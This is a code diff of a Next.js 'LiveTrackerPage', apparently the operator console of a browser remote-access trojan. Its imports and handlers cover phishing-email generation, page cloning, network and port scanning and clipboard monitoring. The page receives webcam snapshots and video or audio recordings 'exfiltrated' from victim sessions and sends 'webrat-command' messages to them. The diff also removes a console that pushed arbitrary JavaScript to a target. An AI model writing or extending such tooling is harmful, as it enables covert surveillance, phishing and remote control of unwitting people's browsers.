@@ -10,22 +10,13 @@ import { InternalNetworkScannerResults } from '@/components/internal-network-sca
 import { PortScannerResults } from '@/components/port-scanner-results';
 import { ClipboardMonitor } from '@/components/clipboard-monitor';
 import { SessionHistory } from '@/components/live-tracker/session-history';
-import { Card, CardHeader, CardTitle } from '@/components/ui/card';
-import { Webcam, Video, Mic, Terminal, Send as SendIcon } from 'lucide-react';
-import { Button } from '@/components/ui/button';
 import { useToast } from '@/hooks/use-toast';
 import { useAuth } from '@/hooks/use-auth';
 import { logActivity } from '@/services/activity-log-service';
-import Image from 'next/image';
-import { Textarea } from '@/components/ui/textarea';
-import { Label } from '@/components/ui/label';
 import { AdvancedPageCloner } from '@/components/advanced-page-cloner';
 import type { JsPayload } from '@/types';
-import { generatePhishingEmail, type PhishingOutput } from '@/ai/flows/phishing-flow';
-import { sendTestEmail, type SmtpConfig } from '@/actions/send-email-action';
-import type { SentEmail } from '@/components/email-outbox';
-import { LiveSessionControls } from '@/components/live-tracker/live-session-controls';
 import { EmailSender } from '@/components/email-sender';
+import { LiveSessionControls } from '@/components/live-tracker/live-session-controls';
 
 
 export default function LiveTrackerPage() {
@@ -35,9 +26,6 @@ export default function LiveTrackerPage() {
   const [isCameraActive, setIsCameraActive] = useState(false);
   const [isMicActive, setIsMicActive] = useState(false);
   const [isRecording, setIsRecording] = useState<'video' | 'audio' | null>(null);
-  const [liveFeedSrc, setLiveFeedSrc] = useState<string | null>(null);
-  
-  const [command, setCommand] = useState('');
   
   const { toast } = useToast();
   const { user } = useAuth();
@@ -53,7 +41,6 @@ export default function LiveTrackerPage() {
   const resetStateForSession = () => {
     setIsCameraActive(false);
     setIsMicActive(false);
-    setLiveFeedSrc(null);
     setIsRecording(null);
   }
 
@@ -78,8 +65,7 @@ export default function LiveTrackerPage() {
             const { data } = newEvent;
             switch(data.type) {
                 case 'image-snapshot':
-                    setLiveFeedSrc(data.snapshot);
-                    setIsCameraActive(true);
+                    // This state is now managed inside LiveSessionControls
                     break;
                 case 'video/webm':
                     toast({ title: "Video Received", description: `A video recording was exfiltrated.`});
@@ -97,7 +83,6 @@ export default function LiveTrackerPage() {
                     } else if (data.message === 'Stream stopped.') {
                         setIsCameraActive(false);
                         setIsMicActive(false);
-                        setLiveFeedSrc(null);
                         setIsRecording(null);
                         toast({ variant: 'destructive', title: 'Stream Stopped', description: `Session ${newEvent.sessionId} has stopped the media stream.`});
                     } else {
@@ -123,35 +108,29 @@ export default function LiveTrackerPage() {
       const firstSessionId = sessionsMap.keys().next().value;
       setSelectedSessionId(firstSessionId);
     }
-  }, [sessionsMap, selectedSessionId]);
+    if (selectedSessionId && !sessionsMap.has(selectedSessionId)) {
+        setSelectedSessionId(sessionsMap.size > 0 ? sessionsMap.keys().next().value : null);
+        resetStateForSession();
+    }
+  }, [sessions, selectedSessionId, sessionsMap]);
 
-  const sendCommandToSession = (command: string, isJsCode = false) => {
+  const sendCommandToSession = (command: string, data: any = {}) => {
     if (!selectedSessionId) {
         toast({ variant: 'destructive', title: 'No session selected' });
         return;
     }
     
     const payload = { 
-        type: 'command', 
+        type: 'webrat-command', 
         sessionId: selectedSessionId, 
-        command: isJsCode ? 'execute-js' : command,
-        ...(isJsCode && { code: command })
+        command,
+        data,
     };
     
     channelRef.current?.postMessage(payload);
     
-    const action = isJsCode ? 'Sent JS Command' : `Sent command: ${command}`;
-    const details = isJsCode ? `Code: ${command.substring(0, 50)}...` : `Session: ${selectedSessionId}`;
-    
-    logActivity({ user: user?.displayName || 'Operator', action, details });
+    logActivity({ user: user?.displayName || 'Operator', action: `Sent RAT Command: ${command}`, details: `Session: ${selectedSessionId}` });
   };
-  
-  const handleSendCommandConsole = () => {
-      if (!command) return;
-      sendCommandToSession(command, true);
-      toast({ title: "Command Sent", description: "The JavaScript command has been sent to the target."});
-      setCommand('');
-  }
   
   const handleRecording = (type: 'video' | 'audio') => {
       const command = `start-${type}-record`;
